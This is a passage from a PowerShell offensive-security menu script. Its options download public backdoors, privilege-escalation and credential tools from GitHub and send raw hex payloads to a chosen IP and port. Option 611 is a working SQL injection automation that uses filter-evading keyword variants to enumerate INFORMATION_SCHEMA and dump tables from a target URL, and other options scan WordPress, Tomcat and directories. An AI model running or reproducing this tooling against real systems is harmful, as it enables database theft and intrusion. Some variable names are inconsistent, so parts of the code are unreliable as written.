        '588' {write-host "Digit a Target IP"; $TIP=read-host "(example, 192.168.168.3)"; if($TIP -ne ""){write-host "Digit a Target PORT"; $SPRT=read-host "(example, 135)"; if($SPRT -ne ""){[int]$TPRT=[int]$SPRT; $ADDR=[System.Net.IPAddress]::Parse($TIP); $END=New-Object System.Net.IPEndPoint $ADDR, $TPRT; $AF=[System.Net.Sockets.AddressFamily]::InterNetwork; $STYPE=[System.Net.Sockets.SocketType]::Stream; $PTYPE=[System.Net.Sockets.ProtocolType]::Tcp; $SOCK=New-Object System.Net.Sockets.Socket $AF, $STYPE, $PTYPE; $SOCK.Ttl=26; $SOCK.Connect($END); while($SOCK.Connected){write-host "Digit or paste a payload encoded in hex decimal values, like \\x00"; $PAYLOAD=read-host "(example, \\x00\\x01\\x02"; [byte[]] $BUFFER = [byte[]] -split (($PAYLOAD -replace "....", "$&," -replace ",$", "").replace("\x", "0x") -split ',' -ne ''); $SENT=$SOCK.Send($BUFFER)}}}}
        '589' {ScaricaSSL "I2rys/NRSBackdoor" "NRSBackdoor.zip" "I2rys/NRSBackdoor/archive/refs/heads/main.zip"}
        '590' {ScaricaRel "lucadenhez/EasyDoor"}
        '591' {ScaricaSSL "BornToBeRoot/PowerShell_IPv4PortScanner" "PowerShell_IPv4PortScanner.zip" "BornToBeRoot/PowerShell_IPv4PortScanner/archive/refs/heads/master.zip"}
        '592' {ScaricaRel "EatonChips/wsh"}
        '593' {ScaricaRel "iomoath/SharpStrike"}
        '594' {ScaricaRel "immunIT/TeamsUserEnum"}
        '595' {ScaricaSSL "connormcgarr/LittleCorporal" "LittleCorporal.exe" "connormcgarr/LittleCorporal/raw/main/LittleCorporal/bin/Release/LittleCorporal.exe"}
        '596' {ScaricaRel "jacob-baines/concealed_position"}
        '597' {ScaricaRel "gentilkiwi/kekeo"}
        '598' {ScaricaRel "p0dalirius/LDAPmonitor"}
        '599' {ScaricaRel "codewhitesec/LethalHTA"}
        '600' {ScaricaSSL "breenmachine/RottenPotatoNG" "RottenPotatoNG.zip" "breenmachine/RottenPotatoNG/archive/refs/heads/master.zip"}
        '601' {ScaricaRel "hugsy/CFB"}
        '602' {ScaricaRel "darkquasar/AzureHunter"}
        '603' {Scarica "nyxgeek/o365recon" "o365recon.ps1" "nyxgeek/o365recon/master/o365recon.ps1"}
        '604' {ScaricaRel "zeroperil/HookDump"}
        '605' {ScaricaSSL "jschicht/Mft2Csv" "Mft2Csv.zip" "jschicht/Mft2Csv/archive/refs/heads/master.zip"}
        '606' {ScaricaSSL "jschicht/MftCarver" "MftCarver.zip" "jschicht/MftCarver/archive/refs/heads/master.zip"}
        '607' {ScaricaSSL "jschicht/MftRcrd" "MftRcrd.zip" "jschicht/MftRcrd/archive/refs/heads/master.zip"}
        '608' {ScaricaSSL "jschicht/MftRef2Name" "MftRef2Name.zip" "jschicht/MftRef2Name/archive/refs/heads/master.zip"}
        '609' {ScaricaRel "Viralmaniar/BigBountyRecon"}
        '610' {write-host "Digit a target IP"; $TIP=read-host "(example, 10.11.12.13)"; if($TIP -ne ""){$TTL=((ping -n 1 $TIP|findstr "TTL").Split()[5].Split("=")[1]); if($TTL -eq 128){write-host $TTL "OS=Windows"}else{write-host TTL "OS=Linux (?)"}}}
        '611' {write-host "Digit a target URL"; $TIP=read-host "(example, https://www.target.com/"; if($TIP -ne ""){write-host "Digit the POST parameters in with the special char"; $PAR=read-host "(example with a single quote, {'email':'hello@gmail.com')"; if($PAR -ne ""){$MSEL=@("SELECT", "SELECt", "SELEcT", "SELEct", "SELeCT", "SELeCt", "SELecT", "SELect", "SElECT", "SElECt", "SElEcT", "SElEct", "SEleCT", "SEleCt", "SElecT", "SElect", "SeLECT", "SeLECt", "SeLEcT", "SeLEct", "SeLeCT", "SeLeCt", "SeLecT", "SeLect", "SelECT", "SelECt", "SelEcT", "SelEct", "SeleCT", "SeleCt", "SelecT", "Select", "sELECT", "sELECt", "sELEcT", "sELEct", "sELeCT", "sELeCt", "sELecT", "sELect", "sElECT", "sElECt", "sElEcT", "sElEct", "sEleCT", "sEleCt", "sElecT", "sElect", "seLECT", "seLECt", "seLEcT", "seLEct", "seLeCT", "seLeCt", "seLecT", "seLect", "selECT", "selECt", "selEcT", "selEct", "seleCT", "seleCt", "selecT", "select", "SELSELECTECT", "selselectect");$MUNI=@("UNION", "UNIOn", "UNIoN", "UNIon", "UNiON", "UNiOn", "UNioN", "UNion", "UnION", "UnIOn", "UnIoN", "UnIon", "UniON", "UniOn", "UnioN", "Union", "uNION", "uNIOn", "uNIoN", "uNIon", "uNiON", "uNiOn", "uNioN", "uNion", "unION", "unIOn", "unIoN", "unIon", "uniON", "uniOn", "unioN", "union", "UNIUNIONON", "uniunionon");$MCON=@("CONCAT", "CONCAt", "CONCaT", "CONCat", "CONcAT", "CONcAt", "CONcaT", "CONcat", "COnCAT", "COnCAt", "COnCaT", "COnCat", "COncAT", "COncAt", "COncaT", "COncat", "CoNCAT", "CoNCAt", "CoNCaT", "CoNCat", "CoNcAT", "CoNcAt", "CoNcaT", "CoNcat", "ConCAT", "ConCAt", "ConCaT", "ConCat", "ConcAT", "ConcAt", "ConcaT", "Concat", "cONCAT", "cONCAt", "cONCaT", "cONCat", "cONcAT", "cONcAt", "cONcaT", "cONcat", "cOnCAT", "cOnCAt", "cOnCaT", "cOnCat", "cOncAT", "cOncAt", "cOncaT", "cOncat", "coNCAT", "coNCAt", "coNCaT", "coNCat", "coNcAT", "coNcAt", "coNcaT", "coNcat", "conCAT", "conCAt", "conCaT", "conCat", "concAT", "concAt", "concaT", "concat", "CONCONCATCAT", "conconcatcat");$MLIM=@("LIMIT", "LIMIt", "LIMiT", "LIMit", "LImIT", "LImIt", "LImiT", "LImit", "LiMIT", "LiMIt", "LiMiT", "LiMit", "LimIT", "LimIt", "LimiT", "Limit", "lIMIT", "lIMIt", "lIMiT", "lIMit", "lImIT", "lImIt", "lImiT", "lImit", "liMIT", "liMIt", "liMiT", "liMit", "limIT", "limIt", "limiT", "limit", "LIMLIMITIT", "limlimitit");$MOFF=@("OFFSET", "OFFSEt", "OFFSeT", "OFFSet", "OFFsET", "OFFsEt", "OFFseT", "OFFset", "OFfSET", "OFfSEt", "OFfSeT", "OFfSet", "OFfsET", "OFfsEt", "OFfseT", "OFfset", "OfFSET", "OfFSEt", "OfFSeT", "OfFSet", "OfFsET", "OfFsEt", "OfFseT", "OfFset", "OffSET", "OffSEt", "OffSeT", "OffSet", "OffsET", "OffsEt", "OffseT", "Offset", "oFFSET", "oFFSEt", "oFFSeT", "oFFSet", "oFFsET", "oFFsEt", "oFFseT", "oFFset", "oFfSET", "oFfSEt", "oFfSeT", "oFfSet", "oFfsET", "oFfsEt", "oFfseT", "oFfset", "ofFSET", "ofFSEt", "ofFSeT", "ofFSet", "ofFsET", "ofFsEt", "ofFseT", "ofFset", "offSET", "offSEt", "offSeT", "offSet", "offsET", "offsEt", "offseT", "offset", "OFFOFFSETSET", "offoffsetset");$MWHE=@("WHERE", "WHERe", "WHErE", "WHEre", "WHeRE", "WHeRe", "WHerE", "WHere", "WhERE", "WhERe", "WhErE", "WhEre", "WheRE", "WheRe", "WherE", "Where", "wHERE", "wHERe", "wHErE", "wHEre", "wHeRE", "wHeRe", "wHerE", "wHere", "whERE", "whERe", "whErE", "whEre", "wheRE", "wheRe", "wherE", "where", "WHEWHERERE", "whewherere");$MFRO=@("FROM", "FROm", "FRoM", "FRom", "FrOM", "FrOm", "FroM", "From", "fROM", "fROm", "fRoM", "fRom", "frOM", "frOm", "froM", "from", "FRFROMOM", "frfromom");write-host "`nA SQLinjection could be triggered, You can choose every statement to bypass";$SELECT=Scegli $MSEL "Choose SELECT statement";$UNION=Scegli $MUNI "Choose UNION statement";$CONCAT=Scegli $MCON "Choose CONCAT statement";$LIMIT=Scegli $MLIM "Choose LIMIT statement";$OFFSET=Scegli $MOFF "Choose OFFSET statement";$WHERE=Scegli $MWHE "Choose WHERE statement";$FROM=Scegli $MFRO "Choose FROM statement";$NPAR=$PAR +" " + $UNION +" " + $SELECT + " version() -- -";write-host $NPAR;(invoke-webrequest -Uri $TIP -Method POST -Body $NPAR).content;$NUM="";for($I = 1; $I -lt 10; $I++){if($NUM -eq ""){$NUM=$I.ToString()+",";}else{$NUM=$NUM+$I.ToString()+",";}$NPAR=$PAR + " " + $UNION + " " + $SELECT + " " + $NUM + "version() -- -";write-host $NPAR;(invoke-webrequest -Uri $TIP -Method POST -Body $NPAR).content;}write-host "Digit the position of version, if was the first occurence, digit 1, otherwise digit the position number ignoring other numbers";write-host "'1,2,8.0.15', the position will be 3 (ignoring the other numbers)";$POS=read-host "(example, 1)";if($POS -ne ""){$LMT=100;$FST=100;write-host "Digit the maximum number to try in LIMIT";$TLMT=read-host "(example, 50, default is 100)";if($TLMT -ne ""){$LMT=$TLMT;}write-host "Digit the maximum number to try in OFFSET";$TFST=read-host "(example, 50, default is 100)";if($TFST -ne ""){$FST=$TFST;}$PES="";if($POS -gt 1){for($I = 0; $I -lt $POS; $I++){$PES=$PES+","+$I;}for($A = 0; $A -le $LMT; $A++){for($B = 0; $B -le $FST; $B++){$NAPR=$PAR + " " + $UNIO + " " + $SELECT + " " + $PES + $CONCAT + '(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, "")' + " " + $FROM + " " + 'INFORMATION_SCHEMA.COLUMNS' + " " + $WHERE + " " + 'TABLE_SCHEMA != "Information_Schema"' + " " + $LIMIT + " " + $A.ToString() + " " + $OFFSET + " " + $B.ToString() + ' -- -';write-host $NPAR;(invoke-webrequest -Uri $TIP -Method POST -Body $NPAR).content;}}}else{for($A = 0; $A -le $LMT; $A++){for($B = 0; $B -le $FST; $B++){$NPAR=$PAR + " " + $UNIO + " " + $SELECT + " " + $CONCAT + '(TABLE_SCHEMA, ":", TABLE_NAME, ":", COLUMN_NAME, "")' + " " + $FROM + " " + 'INFORMATION_SCHEMA.COLUMNS' + " " + $WHERE + " " + 'TABLE_SCHEMA != "Information_Schema"' + " " + $LIMIT + " " + $A.ToString() + " " + $OFFSET + " " + $B.ToString() + ' -- -';write-host $NPAR;(invoke-webrequest -Uri $TIP -Method POST -Body $NAPR).content;}}}$TBLN="0";while($TBLN -ne "quit"){write-host "Digit the TABLE_NAME, the secondo record (TABLE_SCHEMA:TABLE_NAME:COLUMN_NAME)";$TBLN=read-host "(example, Employes, quit for exit)";if($TBLN -ne "" -and $TBLN -ne "quit"){write-host "Digit the COLUMN_NAME, the secondo record (TABLE_SCHEMA:TABLE_NAME:COLUMN_NAME)";$CLMN=read-host "(example, Person, quit for exit)";if($CLMN -ne "" -and $CLMN -ne "quit"){$NPAR=$PAR + " " + $UNION + " " + $SELECT + " " + $CONCAT + '("$CLMN") ' + $FROM + " " + $TBLN + ' -- -';write-host $NPAR;(invoke-webrequest -Uri $TIP -Method POST -Body $NPAR).content;}}}}}}}
        '612' {write-host "WORDPRESS scan; Digit a target URL"; $TURL=read-host "(example, https://www.target.com)";if($TURL -ne ""){Controlla $GHWPL $TURL}}
        '613' {write-host "APACHE-TOMCAT scan; Digit a target URL"; $TURL=read-host "(example, https://www.target.com)";if($TURL -ne ""){Controlla $APACH $TURL}}
        '614' {write-host "DIRECTORIES scan; Digit a target URL"; $TURL=read-host "(example, https://www.target.com)";if($TURL -ne ""){Controlla $DIRLIST $TURL}}
        default{write-host 'ERROR: this choice is incorrect'}
    }
    read-host "Press ENTER to continue";
}